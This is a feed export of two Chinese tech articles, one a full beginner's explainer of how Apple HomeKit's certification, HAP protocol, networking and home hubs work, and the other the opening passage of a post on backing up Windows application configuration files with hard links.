[{"title":"HomeKit 从零完全入门指南（一）：认识 HomeKit","date":"2021-07-23 06:30:00","description":"\n<p>如果你对智能家居有所了解，那应该或多或少听人聊起过 HomeKit。由 Apple 开发并主推的的 HomeKit 既因为产品选择少、价格高而难以成为主流，又因其独特的优秀体验和「出身名门」而成为智能家居领域的焦点。HomeKit 究竟是什么？能做什么？怎么做到的？在《HomeKit 从零完全入门指南》的第一篇里，就让我们从核心原理的角度来解答一下这个核心的问题。</p>\n<h2>HomeKit 是什么？</h2>\n<p>想要准确描述 HomeKit，定义是不可或缺的第一步。然而，HomeKit 和相关的术语其实长期被不少人所混淆。我们来看看 Apple 自己是怎么定义 HomeKit的：</p>\n<blockquote>\n<p>这是 Apple 推出的一组软件开发工具。用 HomeKit 创建的 App 可让您从 Apple 设备控制家中已连接的配件（如电灯、锁或暖气和冷气）。</p>\n<p>——《Apple 词典》</p>\n</blockquote>\n<p>以上的定义说明，HomeKit 的本质其实是一个「开发套件」。它包含了很多常常被大家简称为 HomeKit 的部分，包括：</p>\n<ul>\n<li>iOS 等系统上的 HomeKit 框架</li>\n<li>智能家居设备采用的 HomeKit 设备协议（HomeKit Accessory Protocol，以下简称 HAP 协议）</li>\n<li>HomeKit 设备开发工具包（HomeKit Accessory Development Kit）</li>\n<li>等等</li>\n</ul>\n<p>有些人还可能将 iOS 等系统上预装的「家庭」app 同 HomeKit 混淆，但两者完全不同，我们将在之后对「家庭」app 作进一步的介绍，这里就不做展开说明。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742689320.png\" alt=\"Apple 开发者网站中列出的多个 HomeKit 相关的板块\"><figcaption>Apple 开发者网站中列出的多个 HomeKit 相关的板块</figcaption></figure><p>有了这个定义，我们也就不难理解「Works with Apple HomeKit」这一 HomeKit 官方认证的真实含义了——它表明这一外设兼容于 HomeKit，可以和其它兼容 HomeKit 的软硬件进行交互。那么「Works with Apple HomeKit」认证（以下简称 HomeKit 认证）到底有何特殊之处呢？是否经过认证对于一般的 HomeKit 用户来说有影响吗？</p>\n<h2>Works with Apple HomeKit</h2>\n<p>「Works with Apple HomeKit」认证（以下简称 HomeKit 认证）是苹果 <a href=\"https://mfi.apple.com/\">MFi 计划</a> 的一部分，这意味着想要通过 HomeKit 认证的厂商需要先加入 MFi，然后为单项产品申请 HomeKit 认证。苹果对 MFi 计划有着充分的掌控，说 HomeKit 认证的「含金量」绝大多数来源于其优秀的产品口碑也不为过。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690601.png\" alt=\"「Works with Apple HomeKit」标志｜Apple 开发者\"><figcaption>「Works with Apple HomeKit」标志｜Apple 开发者</figcaption></figure><p>实际上，苹果对 HomeKit 设备的要求并不算高，这一认证成为「品质保障」很大程度上可以说「全靠同行衬托」。与其他智能家居平台直接限制芯片模组的策略不同，目前的 HomeKit 认证并不干涉产品的软件设计和硬件实现，而是对工厂采取备案制。拥有自主生产线的大公司可以为自己的工厂申请资质，通过审查后就获得了生产 HomeKit 认证设备的资格；智能家居领域中占多数的初创公司则可以直接联系已经拥有资质的代工厂，委托其进行生产。这样的模式可以为代工厂带来新的订单，同时也杜绝了「小作坊」生产的可能性。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690617.jpeg\" alt=\"部分 HomeKit 认证代工厂，绝大多数来自中国｜MFi 官网\"><figcaption>部分 HomeKit 认证代工厂，绝大多数来自中国｜<a href=\"https://mfi.apple.com/account/authorized-manufacturers\">MFi 官网</a></figcaption></figure><p>除了生产上的管控外，苹果还要求 HomeKit 申请者拥有其它标准组织例如 Wi-Fi 联盟或蓝牙技术联盟的认证。HomeKit 视觉元素的使用同样受到严格的限制。HomeKit 的设备一般采用静态设置码进行配对，厂商需要根据规范印刷设置码，并保证随机生成、一机一码。对许多 HomeKit 用户来说，设置码贴纸已经成为了 HomeKit 最具代表性的要素之一。</p>\n<p>截至目前，「Works with Apple HomeKit」认证同商用版 HAP 协议是高度绑定的。如果没有申请 HomeKit 认证，设备厂商就无法获取商用版 HAP 协议文档；HomeKit 认证也只面向实现了商用版 HAP 协议的设备开放。不过，在 WWDC21 大会上，苹果已经宣布 HomeKit 将包括对 CHIP（Matter）协议的支持<sup class=\"ss-footnote\" href=\"\" title=\"https://developer.apple.com/videos/play/wwdc2021/101/\" footnote-id=\"1\">1</sup>，因此未来这一认证很有可能将向符合要求的 Matter 设备开放。由于 Matter 设备尚未上市，且暂时无法认证，如果没有特殊说明，在以后的文章中「HomeKit 设备」均指代 HAP 设备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690631.jpeg\" alt=\"HomeKit 框架将包含 CHIP（Matter）子框架｜WWDC 2021\"><figcaption>HomeKit 框架将包含 CHIP（Matter）子框架｜WWDC 2021</figcaption></figure><p>HomeKit 认证的核心之一是「Works with Apple HomeKit」标志的使用许可。通过 HomeKit 认证的产品可以将「Works with Apple HomeKit」标志打印在产品的包装和说明书上，或者在官网、电商等平台使用这一商标进行宣传。与「Made for iPhone」等其它 MFi 标志类似，智能家居厂商可以利用苹果的品牌宣传自己的产品，这一定程度上可以提升产品的溢价。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690644.jpeg\" alt=\"MFi 计划「全家福」｜MFi 官网\"><figcaption>MFi 计划「全家福」｜MFi 官网</figcaption></figure><p>与长期处于争议焦点的 MFi 认证芯片类似，HomeKit 认证也需要使用定制的安全芯片。厂商需要在此基础上进行设计，并且向苹果申请少量安全模块进行试产，试产品通过认证后方能量产。在 2019 年，HomeKit 认证开放了服务器验证方案。选择软件（服务器）验证的厂商可以直接进行预生产，并将产品提交认证；在获得认证后，苹果服务器将同步认证信息，产品也就可以通过 HomeKit 框架的检验了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/23/55712434c91887c09ebeb65d51509c20.png\"><figcaption>HomeKit 自适应照明</figcaption></figure><p>HomeKit 认证设备还可以使用更多的 HomeKit 功能。诸如自适应照明、HomeKit 安全视频等 HomeKit 进阶功能都必须通过 HomeKit 认证才能激活。如果说未经过 MFi 和 MFM（Made for MagSafe）认证的第三方充电线无法激活 iPhone 快充仅仅是让充电变得更慢，那缺少设备 HomeKit 认证可就会带来实打实的功能缺失了。</p>\n<h2>未认证的 HAP 设备</h2>\n<p>在发布之初，HomeKit 仅支持本地的硬件验证。只要正确使用了 HomeKit 安全芯片，即使产品本身尚未取得认证也能通过 HomeKit 的检验。然而，用于试产的芯片数量少，管控严格，几乎没有流向市场，一般消费者很难接触到。在购买时，消费者可能遇到的「未认证 HomeKit 设备」主要有两种情况：采用软件验证方式并且未获得认证的，采用非商用版 HAP 协议的。在通过 HomeKit 添加设备时，如果所添加的设备未能通过验证，系统将通过弹窗进行提醒。</p>\n<p>由于软件验证方案不需要特殊硬件，商用版 HAP 协议的绝大多数基础功能如今均已经被破解且可以直接使用。大名鼎鼎的 HomeBridge 项目就是基于逆向破解的 HAP 协议。HomeKit 会通过「HomeKit 已认证」属性来标记认证状态。在「家庭」app 中，这一属性默认隐藏，只在验证不通过时展示；「家庭」app 还会在顶部横幅提示「此配件尚未经过认证，可能无法配合 HomeKit 稳定运行」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690656.jpeg\" alt=\"采用破解版 HAP 协议的 Homebridge 添加后有「尚未认证」横幅｜@Microhoo\"><figcaption>采用破解版 HAP 协议的 Homebridge 添加后有「尚未认证」横幅｜@Microhoo</figcaption></figure><p>非商用版 HAP 协议无法获得认证，也不会有横幅提示，它的使用体验更接近一般的认证设备。任何注册的 Apple 开发者都可以在网站上获取该协议，但采用非商用版 HAP 协议的设备不得用于商业目的，也不能公开分发或者销售。这实际上是不少人坚持使用破解版协议而不是公开的非商用版协议的原因。不过，由于两种协议的原理和设计基本一致，下文的原理介绍均基于非商用版协议进行讲解。</p>\n<p>值得注意的一点是，无论是以上哪种情况，未认证的 HomeKit 设备均不能使用「Works with Apple HomeKit」商标进行宣传；采用非商用版 HAP 协议的设备更是不允许公开销售。如果大家在选购 HomeKit 设备前后发现了相关的违规情况，应该考虑向苹果举报并进行维权。</p>\n<h2>HAP 的通信机制和安全性</h2>\n<p>在之前的图例中，我们已经展示了 iOS 设备上的 HomeKit 框架是如何工作的，而其中的 HAP 子框架和 HAP 设备之间通信的「语言」正是 HAP 协议。HAP 协议包含了为基于 IP 的设备和基于低功耗蓝牙（Bluetooth LE，以下简称 BLE）的设备设计的两套安全的通信协议。我们可以通过了解 HAP 通信协议一窥 HomeKit 设备与终端（指 iPhone 等控制端设备）设备日常通信的方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690667.png\" alt=\"HAP 实际上由两套协议所组成\"><figcaption>HAP 实际上由两套协议所组成</figcaption></figure><p>对于基于 BLE 的设备，iCloud 将跨设备同步配对信息，因此可以直接用 BLE 建立设备间的点对点通信。为满足 BLE 的数据包大小限制，HAP 协议还规定了数据包拆分发送的规则。对于基于 IP 的设备，HAP 则充分利用了自家的 Bonjour 协议进行广播和发现，并利用 HTTP 进行通信。HomeKit 请求都是由终端设备向 HomeKit 设备发起，然后 HomeKit 设备将按要求更新状态并向终端设备返回信息。HomeKit 还规定了包括加密流（stream）传输在内的其他连接形式，但应用较少，我们就不多介绍了。</p>\n<p>终端设备每发现一台已配对的 HomeKit 设备，就会尝试与之建立会话（session）。HomeKit 设备在初始配置时会生成一对永久密钥。二者会根据交换的随机数据和已记录的永久密钥生成一对临时密钥，其有效期仅维持到当前会话结束为止。所有通信均采用带数据校验的对称加密，因此可以保证可靠性和安全性。任何解码错误或连接断开都会结束当前会话，从而最大程度地防范攻击风险。</p>\n<p>说到这里，其实 HomeKit 最大的特点已经呼之欲出了：与其它智能家居协议通过服务器或者智能音箱作为「中介」进行操作不同，HAP 通信协议在设计上就有点对点、本地和安全这三大特点。这也意味着 HomeKit 完全可以在没有互联网<sup class=\"ss-footnote\" href=\"\" title=\"编注：与之相对的是家庭局域网\" footnote-id=\"2\">2</sup>的恶劣环境中正常工作——我们将在介绍 HomeKit 安全路由器时详细分析其应用。也正是因为这点，HomeKit 无法像其它平台那样通过服务端控制来筛选认证设备，只能采用本地安全芯片。即使后来开放了软件验证选项，在无法联网验证的环境下也只会显示警告，并不会影响使用。</p>\n<h2>HomeKit 本地运行机制详解</h2>\n<p>HomeKit 设备列表、永久密钥和房间分组等信息由 iCloud 负责管理与同步，而实际的设备控制等操作全部在本地完成。为了保障安全性，终端通过 HAP 控制 HomeKit 设备的过程相比其它智能家居平台要繁琐不少——当然，这些差异对用户几乎是无感知的。</p>\n<p>如果你有兴趣对 HomeKit 的控制方式进行更深入的了解，我们可以一起来深入探究一下 HomeKit 工作的每一个环节，并且还可以从中发现 HomeKit 体验不佳的症结，当然跳过这一节也对后续内容的理解不会产生任何影响。</p>\n<p>为了成功建立会话，HomeKit 设备和终端设备需要进行双向的配对。HomeKit 设备上记录了所有可信任设备的列表，一旦发生变化，iCloud 就会通过终端向 HomeKit 设备发送指令来进行更新，以保证其他设备可以正常连接。不在列表中的设备会被直接拒绝访问。对于 BLE 设备而言，这种机制十分接近 AirPods 的「通过 iCloud 自动连接」，可以实现一次配对、多设备无感连接。</p>\n<p>对于基于 IP 的 HomeKit 设备，它们将根据 mDNS（多播 DNS，Multicast DNS）协议在局域网中广播自己的 .local 本地域名<sup class=\"ss-footnote\" href=\"\" title=\"编注：说明自己是谁\" footnote-id=\"3\">3</sup>和 IP 地址<sup class=\"ss-footnote\" href=\"\" title=\"编注：说明自己在哪里\" footnote-id=\"4\">4</sup>。mDNS 的原理就好比是在一个随机入住的酒店里，房客可以时不时向所有房间广播自己的名字和房间号，认识他的其他房客会将他当前的房间号保存下来。根据本地缓存的 mDNS 信息，终端设备就可以用固定的域名访问到局域网中的某个 HomeKit 设备，而无需担心其 IP 地址发生变化。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690680.png\" alt=\"Bonjour 允许局域网内的设备间互相识别并建立连接｜Apple 开发者\"><figcaption>Bonjour 允许局域网内的设备间互相识别并建立连接｜Apple 开发者</figcaption></figure><p>Bonjour 是苹果在十几年前基于 mDNS 和 DNS-SD（DNS 服务发现，DNS Service Discovery）开发的一套软件，它在二者的基础上提供了更高级的接口。HomeKit 设备会使用 Bonjour 注册一个专属服务，HomeKit 则通过查询服务信息来判断该设备是否属于当前「家庭」。终端设备同样会与基于 IP 的 HomeKit 设备自动建立会话。如果终端设备有监视 HomeKit 设备状态的需求（例如传感器的状态变化通知，或家庭中枢的自动化触发等），它将通过 HTTP 维持一个 TCP 长连接来接收实时消息。</p>\n<p>如果 HomeKit 设备数量增加呢？我们假设当前家庭中注册了 30 个基于 IP 的 HomeKit 设备（其中 5 个状态受到监视）和 10 个 基于 BLE 的 HomeKit 设备，那么每台终端设备都需要：</p>\n<ul>\n<li>和 10 台蓝牙外设保持连接；</li>\n<li>和 5 个 IP 设备维持 HTTP 长连接。</li>\n</ul>\n<p>不仅如此，在每台终端设备初次激活 HomeKit 时，会发送多达 60 条 HTTP 请求来进行配对；整个局域网中至少存在着 30 个 Bonjour 节点，它们在不停进行着 mDNS 广播。当我们打开「家庭」app 时，它会通过 HomeKit 请求所有包含在「家庭状态」和「常用配件」中的配件状态，而这些 HTTP 和蓝牙请求全部是「瞬发」的！</p>\n<p>从以上的例子中，我想大家应该已经发现了 HomeKit 体验的「杀手」所在。</p>\n<h2>HomeKit 体验的两大杀手</h2>\n<p>大量 mDNS 节点、瞬发 HTTP 请求、长连接，这些 HomeKit 的行为对路由器产生了巨大的压力，使路由器成为 HomeKit 体验的最大瓶颈和头号杀手。传统的智能家居平台只需要在每台 IP 设备和服务器间维持一个 TCP 长连接，终端设备的所有控制指令和状态获取都直接向服务器进行请求，再由服务器下发到设备上。而 HomeKit 的点对点特性则规定任何指令都需要独立的本地 HTTP 请求，对路由器的瞬时交换能力提出了不小的挑战。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690692.png\" alt=\"传统智能家居平台和 HomeKit 的长连接、最大瞬时请求数量随 IP 设备数量变化\"><figcaption>传统智能家居平台和 HomeKit 的长连接、最大瞬时请求数量随 IP 设备数量变化</figcaption></figure><p>由于 HomeKit 设备发现完全依赖 Bonjour，这对路由器的 mDNS 兼容性也是不小的考验。如果没有进行针对性的优化，路由器很可能因为频繁的 mDNS 广播报文而导致性能下降；如果优化策略有问题，也可能导致 HomeKit 无法正常工作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690704.jpeg\" alt=\"网件 Orbi 路由器曾因为 mDNS 优化算法不佳导致 HomeKit 问题，不得不推出紧急更新｜Orbi 社区论坛\"><figcaption>网件 Orbi 路由器曾因为 mDNS 优化算法不佳导致 HomeKit 问题，不得不推出紧急更新｜Orbi 社区论坛</figcaption></figure><p>HomeKit 体验的另一大杀手则是蓝牙——相比基于 IP 的局域网通信，蓝牙通信虽然功耗低、成本低，但速度也远远不及 Wi-Fi。为保障安全性和通用性，相比其它智能家居协议，HomeKit 指令体积更大、数量也更多，传输速度自然也就更慢。即使是经过优化后，蓝牙设备发送状态更新消息（也就是触发自动化和推送通知）的延迟也只能达到亚秒级，是一般 TCP 请求的百倍，已经处于人可感知的范畴。此外，蓝牙设备信号覆盖范围有限，单个蓝牙设备很难做到全屋可连接；因此通过个人终端连接时很可能出现「未响应」的情况。在后文中我们将看到 HomeKit 是如何通过「家居中枢」来优化蓝牙设备的使用体验的。</p>\n<h2>HomeKit 对 Wi-Fi 系统的挑战</h2>\n<p>相较于路由器，HomeKit 对于 Wi-Fi 的性能需求并不突出，但 Wi-Fi 系统的孱弱仍然有可能成为影响 HomeKit 体验的隐患。这样的挑战是目前阶段绝大多数智能家居平台中普遍存在的，下面我们来简要介绍一下。</p>\n<p>目前，大部分 Wi-Fi 智能家居设备只支持 2.4GHz 频率的 Wi-Fi 4 协议，而且功率较低，穿墙性能和抗干扰能力都较弱。摄像头、传感器等智能家居设备还往往被放在家中的角落，靠单一路由器进行覆盖很可能出现死角。此外，智能家居设备几乎都不支持 MIMO；为了服务这些设备，其他无线设备（例如手机、电脑）的信号很可能受到影响。</p>\n<p>考虑到 Wi-Fi 接入目前仍然是智能家居单品的主流入网方式，在布置 HomeKit（以及其他智能家居系统）前建议先升级自己的无线 AP 布局。对于已经入住的家庭来说，mesh 路由系统是扩展无线覆盖最省心的选择；还在装修阶段的也可以提前布局 AC+AP 方案。为智能家居布设 Wi-Fi 应当尽量确保所有可能安装智能家居设备的位置都有较强的 2.4GHz 信号覆盖，以免设备发生断连掉线。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690717.jpg\" alt=\"mesh 路由器间可以自动连接，合并为一张低延迟的「大网」｜网件 Orbi 官网\"><figcaption>mesh 路由器间可以自动连接，合并为一张低延迟的「大网」｜网件 Orbi 官网</figcaption></figure><h2>HomeKit 家居中枢工作原理</h2>\n<p>HomeKit 家居中枢是 HomeKit 另一个十分特别的存在——在其他智能家居平台中，往往由服务器或网关来承担自动化和远程访问等功能。云端自动化功能灵活，但十分依赖互联网访问，并且可能存在安全和隐私风险；物联网网关虽然位于本地，是离设备最近的「关卡」，但它性能有限，难以承担复杂的逻辑，也往往不支持并行处理多个自动化，容易成为自动化性能的「瓶颈」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690729.png\" alt=\"智能家居自动化的基本流程\"><figcaption>智能家居自动化的基本流程</figcaption></figure><p>HomeKit 创新性地采用了「家居中枢」作为自动化设备。家居中枢位于同一局域网内，HTTP 请求仅有毫秒级延迟。即使是数年前的 A8 芯片，相比其他智能家居设备所使用的芯片依旧拥有碾压级的性能，完全不用担心并行和复杂逻辑问题。由于操作系统「师出同门」，HomeKit 家居中枢甚至支持「快捷指令」这样高度自由的自动化方案。曾经有朋友吐槽过同样的自动化逻辑使用 HomeKit 这样的「外挂」执行速度竟然快于米家的网关自动化，这正暴露出网关设备的性能不足。HomeKit 自动化「纾解」了网关设备的「非网关功能」，反倒提升了整个智能家居系统的性能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690742.png\" alt=\"复杂自动化触发延迟对比示意图\"><figcaption>复杂自动化触发延迟对比示意图</figcaption></figure><p>除此之外，HomeKit 家居中枢还承担着多重意义上的「网关」职能。家居中枢可以作为「代理」执行 HomeKit 指令，并且将非 IP 设备桥接到局域网中。由家居中枢代理的 HomeKit 请求和终端设备直接发出的请求 几乎没有差异。</p>\n<p>对于蓝牙设备来说，它是将蓝牙设备桥接到局域网的网关。蓝牙设备只需要和家居中枢保持连接，HomeKit 就可以通过 HTTP 访问家居中枢进行代理操作，而无需每个终端设备都进行连接。这样以来既减轻了蓝牙设备的压力，又通过「信号择优」的方式提高了蓝牙的设备的响应性能。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690754.png\" alt=\"引入家居中枢前后的蓝牙设备拓扑图\"><figcaption>引入家居中枢前后的蓝牙设备拓扑图</figcaption></figure><p>以上方案充分扩展了蓝牙设备的连接范围，但还没有彻底解决传输速率不足和延迟高的问题。HomePod mini 上首先引入的基于 Thread 的 HAP 协议作为对蓝牙 BLE 的补充，不仅大大提高了响应性，还利用Thread 稳定、低延迟的 mesh 组网进一步扩大了 HomeKit 设备的「朋友圈」。在接入 HomeKit 后，支持 Thread 的蓝牙 HomeKit 设备可以被家居中枢所识别，然后自动加入包含家居中枢的 Thread 网络。如此一来，家居中枢就成为了设备的 Thread 网关，接收到相关请求后会通过 Thread 而不是蓝牙来进行通信，由此解决了延迟问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690767.png\" alt=\"引入 Thread 前后的蓝牙设备拓扑图\"><figcaption>引入 Thread 前后的蓝牙设备拓扑图</figcaption></figure><p>除了蓝牙和 Thread 网关，家居中枢还是所有 HomeKit 设备的「互联网网关」。如果 iPhone 等个人终端并不处于同一局域网中，它们将首先通过 iCloud 连接到家居中枢，并通过家居中枢「代理」进行远程访问。家居中枢和 HomeKit 设备间、家居中枢和个人终端间会分别建立点对点加密会话，iCloud 虽然可能进行二次加密，但并不能获取真正传递的信息，可以说是一种将安全性做到极致的设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690780.png\" alt=\"传统智能家居平台和 HomeKit（已设置家具中枢）的长连接、最大瞬时请求数量随 IP 设备数量变化\"><figcaption>传统智能家居平台和 HomeKit（已设置家具中枢）的长连接、最大瞬时请求数量随 IP 设备数量变化</figcaption></figure><h2>理解 HomeKit 抽象模型</h2>\n<p>在上文中，我们介绍了 HomeKit 的底层通信机制，它根据设备采用的通信协议分为两种不同的类型。在这些协议的基础上，HomeKit 建立了统一的抽象模型来描述它的智能逻辑。相比为了安全性而不惜将问题「复杂化」的通信协议，HomeKit 的抽象模型设计十分简洁。它只包含三个不同层次的核心概念：</p>\n<ul>\n<li>设备（accessory）</li>\n<li>服务（service）</li>\n<li>属性（characteristic）。</li>\n</ul>\n<p>「服务」是对某一类设备功能的抽象。除了名为「设备信息」，用于展示制造商、序列号、固件版本等信息的一个必须的服务外，大部分设备只包含一个服务，和自己的功能相匹配。为了最大程度的抽象和复用，部分服务类型会可能「附加」其它服务。例如「空气净化器」就可以附加「风扇」服务；如果一个设备同时包含「空气净化器」和「风扇」服务，HomeKit 会推断出这是一台空气净化器，「风扇」控制的是空气净化器的风速，并且二者的开关状态应当同步。</p>\n<p>每个服务都规定有可选和必选属性，例如「设备信息」服务中制造商、型号等属性都是必须提供的。属性反映设备的某个特征或者状态，例如开关状态、传感器数据等。属性支持多种不同的权限组合：设备制造商信息是只读（paired read）的，开关既可读（paired read）又可写（paired write），传感器数据等可以用于触发自动化的则必须具备通知（notify）权限。支持推送消息的关键属性则需要在通知的基础上实现事件（event）。除此之外，还有立即写（timed write）、写返回（write with response）、广播（broadcast）、隐藏（hidden）等权限。设备还可以定义私有属性，这些属性在「家庭」app 中将向一般用户隐藏，但可以被 HomeKit 用于控制以及自动化等操作。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690794.png\" alt=\"VOCOlinc FlowerBud 香薰机的 HomeKit 逻辑层次（不含私有属性）\"><figcaption>VOCOlinc FlowerBud 香薰机的 HomeKit 逻辑层次（不含私有属性）</figcaption></figure><p>通过以上介绍我们不难发现，HomeKit 规定了每个设备只能拥有一个主要服务，它反映了该设备的主体功能。然而，HomeKit 中的服务定义又十分克制，很多带有额外传感器的 HomeKit 设备并不能用单一设备来描述。HomeKit 中每个物理设备（即单个 IP 或 BLE 设备）可以对应一个或多个逻辑设备（以下简称子设备），HomeKit 可以通过接口获取逻辑设备列表。在「家庭」app 中，我们可以通过「作为单一板块整体显示」和「作为单独板块分开显示」按钮将子设备聚合或分开显示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690808.png\" alt=\"「家庭」app 中的子设备列表、聚合显示和拆分显示\"><figcaption>「家庭」app 中的子设备列表、聚合显示和拆分显示</figcaption></figure><p>桥接器（网关）是一类特殊的设备，它承担着将非 BLE 或 IP 设备接入 HomeKit 的功能。通过桥接器接入 HomeKit 的设备可以以「产品组合」的形式通过 HomeKit 认证，宣传和销售时除了印刷「Works with Apple HomeKit」标志，还需注明支持 HomeKit 的桥接器型号。有些设备既有自己的功能，又可以用作桥接器（例如 Aqara 空调伴侣 P3）；也有一些设备只有桥接功能，「家庭」app 将它们隐藏到了「家庭设置 &gt; 中枢与桥接」中。我们可以在这一页面查看或移除桥接器。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690821.jpeg\" alt=\"「家庭」app 中的桥接器列表、详情和子设备视图\"><figcaption>「家庭」app 中的桥接器列表、详情和子设备视图</figcaption></figure><h2>HomeKit 设备入网与初始化</h2>\n<p>作为「HomeKit 原理」的最后一块拼图，我们需要谈谈 HomeKit 设备的入网和初始设置流程。为了在本地完成设备的配置和认证，HomeKit 不像米家等平台那样提供「支持设备列表」和操作指南，而是完全依靠蓝牙和 Bonjour 发现（discover）附近的设备。这样反倒创造出了更一致的设备添加流程，成为了 HomeKit 的一大标志性体验。</p>\n<p>对于 BLE 设备来说，未经注册的设备会不停「广播」一个特殊的「HAP 配对」服务，HomeKit 将监听这类广播消息，从而识别附近正在等待配对的设备。Wi-Fi 设备的入网则实际上使用了 MFi 无线设备配置功能；这一功能只对 MFi 计划的认证硬件开放，并且需要专用 BLE 蓝牙芯进行服务广播片以被 iOS 设备发现。还有一类 IP 设备并不通过 HomeKit 的配对流程接入局域网。它们可能使用有线连接，或者拥有更复杂的功能（例如电视机），因此这类设备将直接通过 Bonjour 被发现。</p>\n<p>个人终端设备将结合设置码来自动发现对应的 HomeKit 设备，确认它还未添加到 HomeKit，然后为设备配网。绝大多数 HomeKit 设备采用的静态设置码会以贴纸的形式出现在机身或者说明书等位置，目前主要有二维码贴纸和 NFC 贴纸两种。使用 iOS 或 iPadOS 设备的摄像头或 iPhone 的 NFC 扫描对应贴纸都可以激活配对流程。使用动态设置码的带屏幕设备需要在屏幕上展示二维码供扫描，例如电视机和机顶盒。</p>\n<p>已经正确配对或接入后后，下一步需要进行初始设置。整个流程采用安全远程密码交换协议（Secure Remote Password protocol），需要进行三个来回的信息传递，期间将验证设置码的有效性，并为 HomeKit 设备生成一个长期密钥。这一密钥在还原出厂设置前都将保持不变。设置完成后，HomeKit 就会尝试和该设备建立会话，以上流程全部无错误则设备添加成功。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690833.jpeg\" alt=\"SRP-6 加密原理｜SRP-6 论文\"><figcaption>SRP-6 加密原理｜SRP-6 论文</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_xfzh5jgk/16266742690846.png\" alt=\"HomeKit 设备添加流程\"><figcaption>HomeKit 设备添加流程</figcaption></figure><h2>小结</h2>\n<p>在《HomeKit 从零完全入门指南》的第一篇里，我们将 HomeKit 从添加、连接到控制的整个流程进行了完整的分析，并介绍了 HomeKit 为安全性所做的努力以及一些常见的可能影响 HomeKit 体验的硬件设施。我们还介绍了远程访问、Thread 以及自动化等家庭中枢的专属功能的实现原理。在接下来的章节中，我们将告别底层原理，从实际应用的角度来谈谈 HomeKit 的「使用姿势」。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/67784"},{"title":"使用习惯随身带：Windows 应用配置的管理与备份方案分享","date":"2021-07-23 03:07:02","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>如果你使用 Chrome 或者 VScode，就一定能体会到自动同步设置和插件的幸福，可惜这种幸福并不常有。每一次更换环境，我都得花一大把时间伺候 Typora、ShareX、Everything 等应用，只为将它们配置成我熟悉的样子。</p>\n<p>直到我听闻有一位 Linux 开发者，他将 Linux 系统和应用的关键设置文件使用拷贝下来，这样不论在去哪儿工作，不多时就能让系统变成自己熟悉的样子。而 Windows 中的一部分应用也由可迁移的配置文件控制，只要有方法集中管理和备份这些文件，就能一劳永逸地解决应用设置问题。</p>\n<p>实现这个目标需要解决三个问题：</p>\n<ol>\n<li>去哪找 Windows 应用的配置文件？</li>\n<li>如果它们分散在多个文件夹中，怎么统一管理和备份？</li>\n<li>使用什么工具备份这些文件，又怎么处理文件夹里面不需要同步的东西？</li>\n</ol>\n<h2>相关知识</h2>\n<h3>找到配置文件：三个重要文件夹</h3>\n<p>Windows 是一个多用户的操作系统，从注册表，到文件目录都严格遵循「系统 - 用户」的两级排列方式，配置文件也不例外，它们被设计在存放以下两个文件夹中：</p>\n<ul>\n<li>系统盘根目录隐藏文件夹：<code>ProgramData</code>。存放以管理员权限安装的各类应用的默认设置，如 Microsoft OneDrive。</li>\n<li>用户目录隐藏文件夹：<code>AppData\\Roaming</code>。存放适用于此用户的应用配置。如 Office。</li>\n</ul>\n<p>此外：</p>\n<ul><li>命令行工具，如 Git，Nodejs 的包，其配置文件一般在用户目录，可能被隐藏。</li></ul>\n<p>绿色软件配置文件在自己的文件夹内，UWP 软件被严格隔离在沙盒内，用户正常无法访问其目录；也有特殊的应用，配置文件可以自定义位置，我们能在应用内设置中发现其路径。</p>\n<h3>将文件们集中起来：硬链接和目录链接</h3>\n<p>为了更方便的管理和备份，需要创建一个包含所有配置文件的目录，但为了实时同步用户的更改，又不能用复制的方式。因此我们选择硬链接和目录链接。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/66834\" 